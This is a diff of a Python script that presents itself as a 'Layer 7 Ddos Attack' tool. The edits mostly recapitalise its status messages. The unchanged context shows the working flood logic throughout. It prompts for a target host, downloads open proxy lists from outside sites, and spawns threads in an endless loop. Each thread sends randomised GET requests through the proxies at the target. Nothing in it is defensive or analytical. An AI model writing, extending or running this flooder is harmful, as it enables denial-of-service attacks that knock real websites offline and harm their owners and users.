@@ -1408,15 +1408,15 @@ class Requested(threading.Thread):
                 response = requests.get(url + "?" + buildLock(random.randint(3,10)),headers=headers,proxies=proxies,timeout=None)
                 status_codes = response.status_code
                 Lock.acquire()
-                print("root@bossy:~ Status to Responses in Server---> {}\n").format(status_codes)
+                print("root@bossy:~ Status To Responses İn Server ---> {}\n").format(status_codes)
                 print("root@bossy:~ Layer 7 Attack with Proxy [--{}--]\n ").format(listaproxy[index_proxy])
-                print("root@bossy:~ Requests Server {} stated !!!\n").format(request_counter)
-                print("root@bossy:~ Requests Server {} stated !!!\n").format(Request_counter/5.0)
+                print("root@bossy:~ Requests Server {} Stated !!!\n").format(request_counter)
+                print("root@bossy:~ Requests Server {} Stated !!!\n").format(Request_counter/5.0)
                 Lock.release()
             except requests.exceptions.InvalidURL:
-                print("root@bossy:~ The proxy URL provided is invalid. !\n")
+                print("root@bossy:~ The proxy URL Provided İs İnvalid. !\n")
             except requests.exceptions.InvalidProxyURL:
-                print("root@bossy:~ Check Again the proxy URL provided.\n")
+                print("root@bossy:~ Check Again The Proxy URL Provided.\n")
             except requests.exceptions.ChunkedEncodingError:
 			pass
 	    except requests.exceptions.ConnectionError:
@@ -1424,22 +1424,22 @@ class Requested(threading.Thread):
 	    except requests.exceptions.ReadTimeout:
 			pass
             except httplib.InvalidURL:
-                print("root@bossy:~ Check Again the proxy URL provided.\n")
+                print("root@bossy:~ Check Again The Proxy URL Provided.\n")
             except urllib2.HTTPError :
                 print("root@bossy:~ ======SERVER MIGHT ME Down \n")
             except urllib2.HTTPError as e:
-                print("root@bossy:~ Status to ResponsesHTTPError in Server---> {}\n").format(e.code)
+                print("root@bossy:~ Status To ResponsesHTTPError İn Server ---> {}\n").format(e.code)
                 pass
             except urllib2.URLError:
                 print("root@bossy:~ URL ERROR\n")
             except httplib.BadStatusLine:
                 print("root@bossy:~ Bad Status Line\n")
             except NameError:
-                print("root@bossy:~ List a ProxyHTTP is not define.\n")
+                print("root@bossy:~ List a ProxyHTTP İs Not Define.\n")
             except IOError:
-                print("root@bossy:~ Could not open specified url.\n")
+                print("root@bossy:~ Could Not Open Specified Url.\n")
             except MemoryError:
-                print("root@bossy:~ Memory not open specified url.\n")
+                print("root@bossy:~ Memory Not Open Specified Url.\n")
             except ValueError:
                 print ("root@bossy:~ Checking The URL\n")
             except KeyboardInterrupt:
@@ -1447,7 +1447,7 @@ class Requested(threading.Thread):
         while Close == True:
               #Close Layer7 Attack:
               try:
-                 print("root@bossy:~ Done for Attack Layer7---2019 By Bossy !!!")
+                 print("root@bossy:~ Done For Attack Layer7 & 2019 By Bossy !!!")
               except:
                  sys.exit(3)
 print("")
@@ -1457,16 +1457,15 @@ print("  / __  / /_/ / /| | / /  / /  / __/ / /_/ /\__ \  ")
 print(" / /_/ / _, _/ ___ |/ /__/ /__/ /___/ _, _/___/ /  ")
 print("/_____/_/ |_/_/  |_/____/____/_____/_/ |_|/____/   ")
 print("                              Instagram : @0zctn   ")                                                 
-
-print(" =========>>.:.Hello Bossy ,Welcome Ddos Attack2019 WEBSITE.:.<<=========")
 print("")
+print(" Ctrl + C To Stop The Program ")
 print("")
 if os.name in ('nt', 'dos', 'ce'):
     os.system('title       ........::::: Code By Thunder(Bossy),Layer 7 Ddos Attack :::::........')
     os.system('color 0A')
     
 url = raw_input('root@bossy:~ Host : ')
-print("root@bossy:~ Please Waiting for layer7 Requests !")
+print("root@bossy:~ Please Waiting For Layer7 Requests !")
 try:
    #The Proxy HTTP_HTTPS Update Every Time in The Site:
    in_file = urllib.urlopen('http://spys.me/proxy.txt')
@@ -1490,13 +1489,13 @@ try:
    listaproxy2 = in_file8.readlines() + in_file10.readlines() + in_file11.readlines() 
    listaproxy = listaproxy0 + listaproxy1 + listaproxy2 + listaproxy3 
 except IOError:
-       print("root@bossy:~ Could not open specified Proxy Url.\n")
+       print("root@bossy:~ Could Not Open Specified Proxy Url.\n")
     
 while Close == False:
     try:
         Garena = Requested()
         Garena.start()
     except Exception:
-        print("root@bossy:~ Checking The Exceptions right now !!!\n")
+        print("root@bossy:~ Checking The Exceptions Right Now !!!\n")
     except KeyboardInterrupt:
         exit("root@bossy:~ Canceled By Bossy")
